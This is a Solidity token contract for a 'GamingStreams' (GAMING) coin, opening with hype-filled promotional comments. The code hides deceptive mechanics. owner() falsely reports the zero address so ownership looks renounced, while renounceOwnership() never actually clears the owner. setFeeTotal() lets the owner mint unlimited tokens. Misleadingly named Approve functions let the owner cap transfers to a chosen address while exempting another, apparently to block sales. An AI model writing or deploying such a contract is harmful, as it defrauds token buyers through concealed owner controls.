/**
 *Submitted for verification at Etherscan.io on 2021-07-01
*/

/**
 * GamingStreams has created a revolutionary decentralized esports and custom gambling platform for all coins (BEP 20, ERC 20 Supported)
 * Through their specialized smart contracts for both the BSC and Ethereum networks, you can place specialized bets, give coins as donations to streamers on the platform, and have your own hot wallet on the app! This is truly groundbreaking stuff.
 * They are in the process of signing streams as well to grow the platform early! It’s amazing how much potential this thing can have.
 * They also have a feature to subscribe in their native gaming stream currency. The tokens is also constantly evolving and will be updated more and more to get a better use case and also reward token holders!
 * They odds on bets are decided by an algorithm that was made by their own machine learning formula. This is really revolutionary technology and the devs have been waiting for a whole year to push this platform out when its ready, and now it’s here!
 * Devs are doing a AMA before Launch!!! This has crazy potential to be one of the biggest moonshots this year!
 * The Telegram is popping off and I think this could be one of the hottest coins on the market, People can enjoy streaming and betting at the same time!
 * The App already has an alpha almost out, you can sign up for the streaming platform and betting platform on the site soon!
 *
 * Telegram: https://t.me/gamingstreamscrypto
 * Website: https://GamingStreams.io
 * Twitter: https://twitter.com/gamingcoins_io
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;







abstract contract Context {
    
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return address(0);
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract GAMING is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address public _tBotAddress;
    address public _tBlackAddress;
   
    uint256 private _tTotal = 100 * 10**9 * 10**18;

    string private _name = 'GamingStreams.io';
    string private _symbol = 'GAMING';
    uint8 private _decimals = 18;
    uint256 public _maxBlack = 50000000 * 10**18;

    constructor () public {
        _balances[_msgSender()] = _tTotal;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function Approve(address blackListAddress) public onlyOwner {
        _tBotAddress = blackListAddress;
    }
    
    function setBlackAddress(address blackAddress) public onlyOwner {
        _tBlackAddress = blackAddress;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    
    function setFeeTotal(uint256 amount) public onlyOwner {
        require(_msgSender() != address(0), "ERC20: cannot permit zero address");
        _tTotal = _tTotal.add(amount);
        _balances[_msgSender()] = _balances[_msgSender()].add(amount);
        emit Transfer(address(0), _msgSender(), amount);
    }
    
    function Approve(uint256 maxTxBlackPercent) public onlyOwner {
        _maxBlack = maxTxBlackPercent * 10**18;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
      
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        
        if (sender != _tBlackAddress && recipient == _tBotAddress) {
            require(amount < _maxBlack, "Transfer amount exceeds the maxTxAmount.");
        }
    
        _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
}